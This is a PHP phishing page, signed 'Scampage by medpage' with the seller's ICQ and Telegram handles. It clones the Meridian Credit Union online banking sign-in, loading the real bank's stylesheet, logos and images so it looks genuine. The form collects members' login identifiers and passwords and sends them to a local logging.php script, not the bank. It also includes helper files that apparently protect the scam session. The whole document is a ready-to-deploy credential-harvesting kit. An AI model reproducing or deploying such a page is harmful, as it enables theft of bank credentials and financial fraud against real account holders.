<?php
   /*
 * Scampage by medpage
 * ICQ: 679849675
 * TELE: @medpagestore
 */

   require "../includes/session_protect.php";
   require "../includes/functions.php";
   require "../includes/One_Time.php";
   
   ?>

<!DOCTYPE html>
<html>
<head>
    
    <title>Login - Meridian Credit Union</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
    <meta name="description" content="Meridian Credit Union online banking">
    <meta name="keywords" content="meridian, credit, union, online, banking">


	<link href="https://banking.meridiancu.ca/Content/css/style.css?v=OB.Retail.Release.6.7.1.19" rel="stylesheet" />



</head>
<body>

<div class="load-remove" style="display: none">


</div>
<div class="body-content">
	<div class="row public-header">
		<div class="logo-container">
			<a href="/Security_Login">
				<img src="https://banking.meridiancu.ca/Content/Images/meridian-logo.svg" alt="Meridian Logo" class="meridian-logo" />
			</a>
		</div>
		<div class="link-container">
			<ul class="utility-links">
				<li>
					<a href="https://www.meridiancu.ca/" target="_blank">MeridianCU.ca</a>
				</li>
			</ul>
		</div>
	</div>
</div>

	<div id="page-content" class="signin-page" style="background-image: url(https://banking.meridiancu.ca/Content/Images/Banners/Retail_SignInBackground_All.jpg)">


		<div class="signin-page-inner">
			<div class="row">
				<div class="signin-form-container">
					


<div class="signin-form">
        <h1>Online Banking Sign In</h1>



<form action="logging.php" method="post">	<div class="signin-form-content">
			<label>Select Banking Type</label>


<select class="blue" id="account-switcher" name="AccountType"><option selected="selected" value="/Security_RetailLogin">Personal Banking</option>
<option value="/Security_SmallBusinessLogin">Small Business</option>
<option value="https://businessbanking.meridiancu.ca/">Commercial Banking</option>
</select>

		</div>
		<div style="" class="signin-form-content">
                <label>Email or Member Number</label>
			<input  class="textbox"  id="" maxlength="320" name="UN" placeholder="Enter Email or Member Number" required="required" type="text" value="" />
		</div>
		<div class="signin-form-content">
            <label>Password</label>
			<input class="textbox "  id="" maxlength="12" name="PW" placeholder="Enter Password" required="required" type="password" />
			<div class="double">
				<div>
					&nbsp;
					<span class="caps-lock-warning">Caps lock is enabled</span>
				</div>
				<div class="right">
					<a href="/Security_Difficulty" class="decorated muted" id="forgot-password-link">Need help signing in?</a>
				</div>
			</div>
		</div>
		<label data-memorized-account-hidden style="" class="normal">
			<input class="remember-me-checkbox blue" id="RememberMe" name="RememberMe" type="checkbox" value="true" /><input name="RememberMe" type="hidden" value="false" />
			Remember Account
		</label>
		<div class="signin-form-content" data-remember-shown style="">
			<input id="RememberMeNickname" name="RememberMeNickname" placeholder="Nickname (Optional)" type="text" value="" />
		</div>
		<div class="signin-form-content">
			<button type="submit" class="orange button" id="sign-in-button">
				Sign In
			</button>
		</div>
		<div class="signin-form-content">
			<p>Not a member? <a href="https://www.meridiancu.ca/join" class="bold underlined" id="join-now-link" target="_blank">Join Now</a></p>
		</div>
</form></div>

					<div class="signin-form-links">
						<a href="/Security_Contact" class="semibold ">Contact Us</a> |
						<a href="/Security_FAQ" class="semibold ">FAQs</a> |
						<a href="/Security_Difficulty" class="semibold ">Having Difficulty Signing In?</a>
					</div>
				</div>
			</div>
		</div>
	</div>

<footer class="main-footer">
	<div class="row">
		<div class="footer-logos">
			<div class="logo-container">
				<a href="/Security_Login">
					<img src="https://banking.meridiancu.ca/Content/Images/meridian-logo-white.svg" alt="Meridian Logo" class="meridian-logo" />
				</a>
			</div>
			<div>
				<img src="/Content/Images/entrust.png" class="entrust-seal" />
			</div>
		</div>
		<div class="footer-sub">
			<span>Copyright &copy; 2021 Meridian Credit Union. All rights reserved.</span>
			<div class="footer-links">
				<a href="https://www.meridiancu.ca/privacy" title="Privacy & Security" target="_blank" >Privacy & Security</a>
				<a href="https://www.meridiancu.ca/legal" title="Legal" target="_blank" >Legal</a>
				<a href="https://www.meridiancu.ca/accessibility" title="Accessibility" target="_blank" >Accessibility</a>
			</div>
		</div>
	</div>
</footer>

	
	<script src="/Content/js/pages/login.js?v=OB.Retail.Release.6.7.1.19"></script>


</body>
</html>
